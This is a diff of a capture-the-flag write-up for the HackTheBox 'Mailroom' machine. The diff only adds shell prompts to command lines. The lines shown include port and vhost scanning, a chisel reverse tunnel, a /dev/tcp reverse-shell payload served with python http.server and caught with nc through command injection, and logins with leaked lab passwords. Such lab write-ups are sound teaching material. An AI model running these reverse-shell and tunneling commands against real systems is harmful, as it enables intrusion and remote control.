@@ -20,8 +20,8 @@ Mailroom is a long medium Linux box and the web chain is the point. Every bug fe
 A full sweep plus scripts and versions:
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.227
-nmap -p 22,80 -sCV 10.10.11.227
+$ nmap -p- --min-rate 10000 10.10.11.227
+$ nmap -p 22,80 -sCV 10.10.11.227
 ```
 
 Two ports:
@@ -53,7 +53,7 @@ http://mailroom.htb/contact.php  ->  http://mailroom.htb/inquiries/edf1a02981408
 Content discovery with a `.php` extension confirmed `/inquiries/`, `/css/`, `/js/`, `/assets/`, `/font/`. The interesting part was vhost enumeration. Fuzzing the `Host` header found two more names:
 
 ```bash
-wfuzz -u http://10.10.11.227 -H "Host: FUZZ.mailroom.htb" \
+$ wfuzz -u http://10.10.11.227 -H "Host: FUZZ.mailroom.htb" \
   -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7746
 ```
 
@@ -191,7 +191,7 @@ tristan@mailroom.htb
 SSH took those directly:
 
 ```bash
-ssh tristan@mailroom.htb   # 69trisRulez!
+$ ssh tristan@mailroom.htb   # 69trisRulez!
 ```
 
 ## user
@@ -209,9 +209,9 @@ Now I had a working second factor. The catch is the panel listens only on `127.0
 
 ```bash
 # attacker
-sudo ./chisel server -p 8088 -reverse -v
+$ sudo ./chisel server -p 8088 -reverse -v
 # tristan on the box
-./chisel client 10.10.16.65:8088 R:80:127.0.0.1:80
+$ ./chisel client 10.10.16.65:8088 R:80:127.0.0.1:80
 ```
 
 That maps my `127.0.0.1:80` to the box's `127.0.0.1:80`. With `127.0.0.1 staff-review-panel.mailroom.htb` in my hosts file and a fresh token from the mailbox, hitting `auth.php?token=...` set the session and redirected me to `dashboard.php`, then `inspect.php`. (A SOCKS proxy via `ssh -D 1080` plus a hosts entry works the same way if you prefer not to deploy chisel.)
@@ -230,9 +230,9 @@ echo "$output";
 The backticks make `cat` run `id` first. To get a shell I staged a reverse-shell file and pulled it through the injection. On my box:
 
 ```bash
-echo "sh -i >& /dev/tcp/10.10.16.65/7777 0>&1" > rev.sh
-python3 -m http.server 9999
-nc -lvnp 7777
+$ echo "sh -i >& /dev/tcp/10.10.16.65/7777 0>&1" > rev.sh
+$ python3 -m http.server 9999
+$ nc -lvnp 7777
 ```
 
 Then in the `inspect.php` `inquiry_id` field, two backtick payloads in sequence, fetch and execute:
@@ -257,7 +257,7 @@ Hunting the container webroot, `/var/www/staffroom/.git/config` leaked a credent
 URL-decoded, `%23` is `#`, so the password is `HueLover83#`. That account is also a Linux user on the host, and `su` worked:
 
 ```bash
-su - matthew   # HueLover83#
+$ su - matthew   # HueLover83#
 ```
 
 matthew owned the user flag.
@@ -318,7 +318,7 @@ root / a$gBa3!GA8
 And `su` finished it:
 
 ```bash
-su -   # a$gBa3!GA8
+$ su -   # a$gBa3!GA8
 ```
 
 That gave root and the root flag.
